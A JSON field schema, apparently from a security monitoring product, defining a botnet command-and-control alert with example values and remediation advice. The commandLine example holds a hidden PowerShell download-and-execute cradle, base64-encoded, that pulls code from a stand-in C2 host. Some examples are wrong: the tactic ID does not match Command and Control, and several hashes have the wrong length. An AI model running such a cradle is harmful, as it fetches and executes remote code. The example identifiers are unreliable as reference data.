{
  "group": "alert",
  "category": "malware",
  "title": "botnet",
  "label": "Botnet",
  "description": "Monitors and alerts on malicious botnet activities, including command and control communications, data exfiltration, and automated attacks.",
  "dataSource": [
    "Antivirus",
    "Endpoint Detection And Response System",
    "Firewall",
    "Network Detection and Response"
  ],
  "definitions": {
    "startTime": {
      "example": "2023-10-26 14:32:18"
    },
    "endTime": {
      "example": "2023-10-26 14:32:48"
    },
    "deviceReceiptTime": {
      "example": "2023-10-26 14:32:20"
    },
    "processUserName": {
      "example": "SYSTEM"
    },
    "parentProcessUserName": {
      "example": "SYSTEM"
    },
    "processStartTime": {
      "example": "2023-10-26 14:32:15"
    },
    "parentProcessStartTime": {
      "example": "2023-10-26 14:32:10"
    },
    "image": {
      "example": "C:\\Windows\\System32\\cmd.exe"
    },
    "parentImage": {
      "example": "C:\\Windows\\System32\\services.exe"
    },
    "fileName": {
      "example": "cmd.exe"
    },
    "parentProcessName": {
      "example": "services.exe"
    },
    "md5": {
      "example": "d41d8cd98f00b204e9800998ecf8427e"
    },
    "sha256": {
      "example": "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef"
    },
    "sm3": {
      "example": "5d41402abc4b2a76b9719d911017c592"
    },
    "virusName": {
      "example": "Worm.Win32.Mydoom"
    },
    "virusFamily": {
      "example": "Mydoom"
    },
    "threatActorOrg": {
      "example": "Lazarus Group"
    },
    "requestDomain": {
      "example": "malicious-botnet-c2-server.example.com"
    },
    "machineCode": {
      "example": "WS-2023-SRV-001"
    },
    "productVendorName": {
      "example": "Microsoft"
    },
    "deviceSendProductName": {
      "example": "Windows Defender"
    },
    "deviceName": {
      "example": "WIN-SERVER-2023"
    },
    "deviceAddress": {
      "example": "192.168.1.100"
    },
    "eventId": {
      "example": "550e8400-e29b-41d4-a716-446655440000"
    },
    "name": {
      "example": "Botnet C2 Communication Detected"
    },
    "message": {
      "example": "Botnet command and control communication detected from host 192.168.1.100 (WIN-SERVER-2023) to domain malicious-botnet-c2-server.example.com via process cmd.exe (C:\\Windows\\System32\\cmd.exe) with hash a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef. The activity is associated with the Mydoom malware family and attributed to threat actor Lazarus Group. Windows Defender alerted on this malicious traffic."
    },
    "collectorReceiptTime": {
      "example": "2023-10-26 14:32:22"
    },
    "catOutcome": {
      "example": "FAIL"
    },
    "logType": {
      "example": "alert"
    },
    "opType": {
      "example": "connect"
    },
    "srcMacAddress": {
      "example": "00:1A:2B:3C:4D:5E"
    },
    "destMacAddress": {
      "example": "00:0C:29:8F:3A:1B"
    },
    "srcGeoCountry": {
      "example": "United States"
    },
    "srcGeoRegion": {
      "example": "California"
    },
    "srcGeoCity": {
      "example": "Los Angeles"
    },
    "srcGeoAddress": {
      "example": "12345 Westwood Blvd, Los Angeles, CA 90024"
    },
    "destGeoCountry": {
      "example": "United States"
    },
    "destGeoRegion": {
      "example": "California"
    },
    "destGeoCity": {
      "example": "San Francisco"
    },
    "destGeoAddress": {
      "example": "456 Market Street, San Francisco, CA 94105"
    },
    "dataSourceAddress": {
      "example": "192.168.1.100"
    },
    "transProtocol": {
      "example": "TCP"
    },
    "appProtocol": {
      "example": "http"
    },
    "dvcAction": {
      "example": "blocked"
    },
    "direction": {
      "example": "01"
    },
    "deviceVersion": {
      "example": "Windows 10 Pro 10.0.19045 Build 19045"
    },
    "srcAddress": {
      "example": "192.168.1.100"
    },
    "destAddress": {
      "example": "203.0.113.45"
    },
    "subTechniqueId": {
      "example": "T1071.001"
    },
    "techniqueName": {
      "example": "Application Layer Protocol"
    },
    "techniqueId": {
      "example": "T1071"
    },
    "tacticName": {
      "example": "Command and Control"
    },
    "tacticId": {
      "example": "TA0001"
    },
    "killChain": {
      "example": "KC_CommandControl"
    },
    "confidence": {
      "example": "High"
    },
    "ruleId": {
      "example": "BOTNET-C2-DETECT-20231026-001"
    },
    "ruleType": {
      "example": "/Malware/Bot"
    },
    "ruleName": {
      "example": "Botnet C2 Communication Detection via HTTP"
    },
    "attackerAddress": {
      "example": "203.0.113.45"
    },
    "victimAddress": {
      "example": "192.168.1.100"
    },
    "subTechniqueName": {
      "example": "Web Protocols"
    },
    "suggestion": {
      "example": "Isolate the infected host WIN-SERVER-2023 (192.168.1.100) from the network immediately. Block all outbound communication to the malicious C2 domain malicious-botnet-c2-server.example.com and IP 203.0.113.45 at the firewall. Terminate the malicious process cmd.exe (PID to be determined) and its parent process services.exe. Initiate a full system scan using Windows Defender or an updated endpoint detection and response (EDR) tool to remove the Mydoom malware variant. Collect and analyze the malicious file cmd.exe (hash: a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef) for further investigation. Review and update firewall and proxy rules to prevent future connections to known malicious infrastructure. Reset passwords for any accounts used on the compromised system. Investigate the initial infection vector and apply necessary patches or security controls."
    },
    "IoC": {
      "example": "malicious-botnet-c2-server.example.com"
    },
    "IoCType": {
      "example": "domain"
    },
    "tiCategory": {
      "example": "/C2"
    },
    "IoCLevel": {
      "example": "High"
    },
    "tiSubcategory": {
      "example": "/C2/Trojan"
    },
    "processMd5": {
      "example": "d41d8cd98f00b204e9800998ecf8427e"
    },
    "parentProcessMd5": {
      "example": "5d8e15853a549d0c3b3c940a8f6bc7b3"
    },
    "processChain": {
      "example": "C:\\Windows\\System32\\smss.exe -> C:\\Windows\\System32\\csrss.exe -> C:\\Windows\\System32\\wininit.exe -> C:\\Windows\\System32\\services.exe -> C:\\Windows\\System32\\cmd.exe"
    },
    "processGuid": {
      "example": "{550e8400-e29b-41d4-a716-446655440001}"
    },
    "parentProcessGuid": {
      "example": "{550e8400-e29b-41d4-a716-446655440000}"
    },
    "commandLine": {
      "example": "cmd.exe /c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBiAG8AdABuAGUAdAAtAGMAMgAtAHMAZQByAHYAZQByAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AYwAyAC8AZwBlAHQALQBjAG8AbQBtAGEAbgBkAHMAJwApAA=="
    },
    "parentCommandLine": {
      "example": "C:\\Windows\\System32\\services.exe -k LocalSystemNetworkRestricted"
    },
    "hostName": {
      "example": "WIN-SERVER-2023"
    },
    "hostAddress": {
      "example": "192.168.1.100"
    },
    "integrityLevel": {
      "example": "System"
    }
  }
}